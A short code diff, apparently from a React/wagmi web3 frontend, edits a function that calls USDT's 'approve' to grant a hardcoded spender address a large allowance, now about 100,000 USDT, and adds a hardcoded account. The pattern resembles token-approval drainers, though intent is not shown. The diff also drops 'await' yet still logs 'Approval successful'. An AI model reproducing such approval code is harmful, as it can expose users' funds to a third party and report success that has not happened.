@@ -10,14 +10,16 @@ const { writeContract } = useWriteContract()
 async function approve() {
   try {
     alert('Approving...');
-    await writeContract({
+    writeContract({
       abi,
       address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT合约地址
       functionName: 'approve',
       args: [
         '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', // 被授权地址
-        999999999999999n, // 授权金额
+        BigInt(100000000000), // 授权金额
       ],
+      chain: undefined,
+      account: '0x53f989804eFE987Cd9837C8367126a94190E28c9'
     });
     console.log('Approval successful');
   } catch (error) {
